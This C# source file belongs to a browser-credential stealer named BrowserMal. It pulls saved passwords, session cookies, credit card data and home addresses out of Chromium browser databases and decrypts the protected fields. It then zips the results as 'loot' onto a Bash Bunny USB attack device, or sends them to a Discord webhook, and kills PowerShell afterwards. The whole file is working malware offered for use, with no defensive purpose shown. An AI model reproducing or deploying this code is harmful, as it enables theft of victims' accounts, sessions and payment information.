﻿using BrowserMal.Browser;
using System.Collections.Generic;
using BrowserMal.Manager;
using BrowserMal.Model;
using BrowserMal.Util;

namespace BrowserMal
{
    public class Class1
    {
        private static readonly BrowserManager browserManager = new BrowserManager();
        private static readonly GeckoBrowserManager geckoBrowserManager = new GeckoBrowserManager();
        private static readonly Dictionary<string, string> list = new Dictionary<string, string>();

        public static void StartCreds()
        {
            browserManager.Init();
            List<BrowserModel> browsers = browserManager.GetBrowsers();

            Chromium(ref browsers);
            //Gecko(ref browsers);

            Extration();
            ProcessUtil.KillProcessDelayed(1, "powershell.exe");
        }

        private static void Extration()
        {
            string root = GetBashBunny();

            if (string.IsNullOrEmpty(root))
            {
                Discord.Webhook.BulkSend(list);
                return;
            }

            Filesaver.FileManager.SaveBytes(root, "loot", Zip.ZipArchives(list));
        }

        private static void Chromium(ref List<BrowserModel> browsers)
        {
            List<ColumnModel> credsColumns = new List<ColumnModel>
            {
                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("username_value", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("password_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            ChromiumManager<CredentialModel> credentialsManager = new ChromiumManager<CredentialModel>("logins", new SqliteTableModel(credsColumns));
            list.AddRange(credentialsManager.Init(ref browsers, ChromiumUtil.LOGIN_DATA));

            // get cookies
            List<ColumnModel> cookiesColumns = new List<ColumnModel>
            {
                new ColumnModel("host_key", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("name", isEncrypted: false, needsFormatting: false, isImportant: true),
                new ColumnModel("path", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expires_utc", isEncrypted: false, needsFormatting: true, isImportant: false, ChromiumUtil.ChromiumToUnixTimestamp),
                new ColumnModel("encrypted_value", isEncrypted: true, needsFormatting: false, isImportant: true)
            };
            ChromiumManager<CookieModel> cookiesManager = new ChromiumManager<CookieModel>("cookies", new SqliteTableModel(cookiesColumns));
            list.AddRange(cookiesManager.Init(ref browsers, ChromiumUtil.COOKIES));

            // get credit cards
            List<ColumnModel> creditCardsColumns = new List<ColumnModel>()
            {
                new ColumnModel("name_on_card", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_month", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("expiration_year", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("nickname", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("card_number_encrypted", isEncrypted: true, needsFormatting: false, isImportant: false)
            };
            ChromiumManager<CreditCardModel> creditCardsManager = new ChromiumManager<CreditCardModel>("credit_cards", new SqliteTableModel(creditCardsColumns));
            list.AddRange(creditCardsManager.Init(ref browsers, ChromiumUtil.WEB_DATA));

            List<ColumnModel> addressesColumns = new List<ColumnModel>()
            {
                new ColumnModel("street_address", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("city", isEncrypted: false, needsFormatting: false, isImportant: false),
                new ColumnModel("zipcode", isEncrypted: false, needsFormatting: false, isImportant: false)
            };
            ChromiumManager<AddressesModel> addressesManager = new ChromiumManager<AddressesModel>("autofill_profiles", new SqliteTableModel(addressesColumns));
            list.AddRange(addressesManager.Init(ref browsers, ChromiumUtil.WEB_DATA));
        }

        public static void Gecko(ref List<BrowserModel> browsers)
        {
            List<ColumnModel> credsColumns = new List<ColumnModel>
            {
                new ColumnModel("origin_url", isEncrypted: false, needsFormatting: false, isImportant: false),
            };

            geckoBrowserManager.Init();

            GeckoManager<CredentialModel> geckoManager = new GeckoManager<CredentialModel>("logins.json", new SqliteTableModel(credsColumns));
            geckoManager.Init(ref browsers);
        }

        private static string GetBashBunny() => RemovableDisks.FindBashBunny();
    }
}
